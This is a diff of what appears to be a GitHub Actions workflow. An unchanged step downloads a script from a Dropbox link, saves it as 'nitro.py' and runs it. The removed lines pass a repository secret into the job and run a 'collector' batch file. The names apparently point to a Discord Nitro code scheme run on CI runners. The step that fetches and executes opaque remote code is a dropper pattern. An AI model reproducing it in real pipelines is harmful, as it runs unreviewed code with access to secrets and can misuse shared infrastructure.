@@ -15,8 +15,3 @@ jobs:
             Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/zeontu4hgzbc5npo2j8u9/nitrogencode.txt?rlkey=dqzmorxoriveztqpp3epffwtk&dl=1" -OutFile "nitro.py"
             python -m pip install certifi charset-normalizer idna requests urllib3
             py nitro.py
-        env:
-             AntiCopyFeature: ${{ secrets.THIS_IS_IN_BETA_SKID }}
-
-      - name: running the collector 🔥🔥
-        run: cmd /c Preparation.bat
